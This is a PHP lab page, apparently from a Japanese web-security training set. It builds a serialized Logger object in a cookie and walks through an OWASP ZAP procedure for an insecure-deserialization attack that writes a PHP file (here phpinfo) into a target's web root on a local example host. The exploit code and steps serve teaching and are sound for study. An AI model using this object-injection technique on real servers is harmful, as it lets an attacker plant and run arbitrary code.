<?php
class Logger {
  private $filename = '';  // ログファイル名
  private $log = '';       // ログバッファ

  public function __construct() {
    $this->filename = '../var/www/html/xinfo.php';
    // $this->filename = './xinfo.php';
    $this->log = '<?php phpinfo(); ?>';
  }
}

$logger = new Logger();
setcookie('COLORS', serialize($logger));
?><body>
以下の手順で攻撃します。<br>
<ol>
<li>以下の内容を<input type="button" value="クリップボードにコピー" onclick="copy()"><br>
<textarea id="cookiearea" cols="80" rows="2">
Cookie: COLORS=<?php echo htmlspecialchars(urlencode(serialize($logger))); ?>
</textarea><br></li>
<li>OWASP ZAPで「標準モード」であることを確認して、緑色の「全てのリクエストにブレークポイントセット」をクリックし、矢印が赤色になることを確認する</li>
<li><a href="http://example.jp/4e/4e-011.php">このリンク</a>から攻撃対象サイトにアクセスする</li>
<li>OWASP ZAP上でブレークするので先にコピーしたCookieヘッダをペーストする</li>
<li>OWASP ZAP上で「サブミットして次のブレークポイントに移動」（青い三角形ボタン）を実行する</li>
<li><a href="http://example.jp/xinfo.php">このリンク</a>で攻撃成功を確認する</li>
<li><a href="4e-015.php">このリンク</a>で攻撃コードを削除する</li>
</ol>
<script>
// var button = document.getElementById('button');
//button.onclick = function(){
function copy() {
  var textarea = document.getElementById('cookiearea');
  textarea.select();
  document.execCommand('copy');
};
</script>
</body>
